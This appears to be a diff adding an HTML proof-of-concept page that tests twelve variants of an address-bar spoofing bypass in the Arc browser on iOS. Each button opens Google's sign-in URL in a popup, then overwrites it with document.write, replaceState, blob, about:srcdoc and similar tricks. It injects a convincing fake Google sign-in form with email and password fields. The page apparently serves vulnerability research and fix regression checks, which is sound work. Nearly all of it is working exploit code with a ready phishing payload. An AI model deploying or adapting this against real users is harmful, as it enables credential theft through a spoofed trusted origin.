@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Arc iOS — Empty Origin Bypass</title>
+<style>
+body{font-family:-apple-system,sans-serif;max-width:480px;margin:0 auto;padding:24px 16px;background:#fff;color:#1d1d1f}
+h2{font-size:18px;margin-bottom:8px}
+p{font-size:14px;color:#666;line-height:1.5;margin-bottom:20px}
+button{display:block;width:100%;padding:16px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:10px}
+button:active{opacity:.7}
+.info{font-size:11px;color:#999;margin:-6px 0 14px 4px}
+</style>
+</head>
+<body>
+<h2>Empty Origin Bypass Tests</h2>
+<p>Tap each button, then check the address bar in the popup.</p>
+
+<button onclick="V1()">V1 — replaceState empty string</button>
+<div class="info">document.write + history.replaceState('', '', '')</div>
+
+<button onclick="V2()">V2 — replaceState space</button>
+<div class="info">document.write + history.replaceState('', '', ' ')</div>
+
+<button onclick="V3()">V3 — replaceState dot</button>
+<div class="info">document.write + history.replaceState('', '', '.')</div>
+
+<button onclick="V4()">V4 — blob URL + revoke</button>
+<div class="info">open blob: URL, revoke it, then document.write</div>
+
+<button onclick="V5()">V5 — about:blank# (fragment)</button>
+<div class="info">anchor.click to about:blank# then write</div>
+
+<button onclick="V6()">V6 — about:srcdoc</button>
+<div class="info">anchor.click to about:srcdoc then write</div>
+
+<button onclick="V7()">V7 — javascript:void(0)</button>
+<div class="info">window.open('javascript:void(0)') then write</div>
+
+<button onclick="V8()">V8 — anchor google + longer delay</button>
+<div class="info">Original PoC but with 500ms delay (let nav start further)</div>
+
+<button onclick="V9()">V9 — double write (empty then content)</button>
+<div class="info">document.write('') then document.write(content)</div>
+
+<button onclick="V10()">V10 — location.replace + write</button>
+<div class="info">w.location.replace('about:blank') then write after delay</div>
+
+<button onclick="V11()">V11 — _blank (unnamed window)</button>
+<div class="info">window.open('', '_blank') instead of named window</div>
+
+<button onclick="V12()">V12 — original PoC (regression check)</button>
+<div class="info">Exact original poc1.html — should show about:blank if fixed</div>
+
+<script>
+var CONTENT='<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title></head><body style="font-family:-apple-system,sans-serif;background:#fff;margin:0"><div style="max-width:380px;margin:0 auto;padding:40px 24px;text-align:center"><div style="font-size:24px;margin-bottom:4px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div><h1 style="font-size:22px;font-weight:400;color:#202124;margin:10px 0 4px">Sign in</h1><p style="color:#5f6368;font-size:14px;margin-bottom:20px">to continue to your account</p><input placeholder="Email or phone" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><input type="password" placeholder="Password" style="width:100%;padding:14px;border:1px solid #dadce0;border-radius:6px;font-size:16px;margin:6px 0;-webkit-appearance:none"><div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px"><a href="#" style="color:#1a73e8;text-decoration:none;font-size:14px">Create account</a><button style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:6px;font-size:14px;font-weight:500">Next</button></div></div></body></html>';
+
+function inject(w){
+  if(!w)return;
+  w.document.open();
+  w.document.write(CONTENT);
+  w.document.close();
+  w.stop();
+}
+
+function openAnchor(url,name){
+  var a=document.createElement('a');
+  a.href=url;
+  a.target=name;
+  a.style.display='none';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+// V1: replaceState empty
+function V1(){
+  openAnchor('https://accounts.google.com/signin','v1');
+  setTimeout(function(){
+    var w=window.open('','v1');
+    inject(w);
+    try{w.history.replaceState({},'','');}catch(e){}
+  },50);
+}
+
+// V2: replaceState space
+function V2(){
+  openAnchor('https://accounts.google.com/signin','v2');
+  setTimeout(function(){
+    var w=window.open('','v2');
+    inject(w);
+    try{w.history.replaceState({},'','\u0020');}catch(e){}
+  },50);
+}
+
+// V3: replaceState dot
+function V3(){
+  openAnchor('https://accounts.google.com/signin','v3');
+  setTimeout(function(){
+    var w=window.open('','v3');
+    inject(w);
+    try{w.history.replaceState({},'','.');}catch(e){}
+  },50);
+}
+
+// V4: blob URL + revoke
+function V4(){
+  var blob=new Blob([''],{type:'text/html'});
+  var url=URL.createObjectURL(blob);
+  var w=window.open(url,'v4');
+  URL.revokeObjectURL(url);
+  setTimeout(function(){
+    try{inject(w);}catch(e){}
+  },100);
+}
+
+// V5: about:blank#
+function V5(){
+  openAnchor('about:blank#','v5');
+  setTimeout(function(){
+    var w=window.open('','v5');
+    inject(w);
+  },50);
+}
+
+// V6: about:srcdoc
+function V6(){
+  openAnchor('about:srcdoc','v6');
+  setTimeout(function(){
+    var w=window.open('','v6');
+    inject(w);
+  },50);
+}
+
+// V7: javascript:void(0)
+function V7(){
+  var w=window.open('javascript:void(0)','v7');
+  setTimeout(function(){inject(w);},50);
+}
+
+// V8: original + longer delay
+function V8(){
+  openAnchor('https://accounts.google.com/signin','v8');
+  setTimeout(function(){
+    var w=window.open('','v8');
+    inject(w);
+  },500);
+}
+
+// V9: double write
+function V9(){
+  openAnchor('https://accounts.google.com/signin','v9');
+  setTimeout(function(){
+    var w=window.open('','v9');
+    if(!w)return;
+    w.document.open();
+    w.document.write('');
+    w.document.close();
+    setTimeout(function(){
+      w.document.open();
+      w.document.write(CONTENT);
+      w.document.close();
+      w.stop();
+    },50);
+  },50);
+}
+
+// V10: location.replace then write
+function V10(){
+  openAnchor('https://accounts.google.com/signin','v10');
+  setTimeout(function(){
+    var w=window.open('','v10');
+    if(!w)return;
+    try{w.location.replace('about:blank');}catch(e){}
+    setTimeout(function(){inject(w);},100);
+  },50);
+}
+
+// V11: unnamed _blank window
+function V11(){
+  var w=window.open('','_blank');
+  if(!w)return;
+  setTimeout(function(){inject(w);},50);
+}
+
+// V12: original PoC (regression)
+function V12(){
+  openAnchor('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn','poc');
+  setTimeout(function(){
+    var w=window.open('','poc');
+    inject(w);
+  },50);
+}
+</script>
+</body>
+</html>
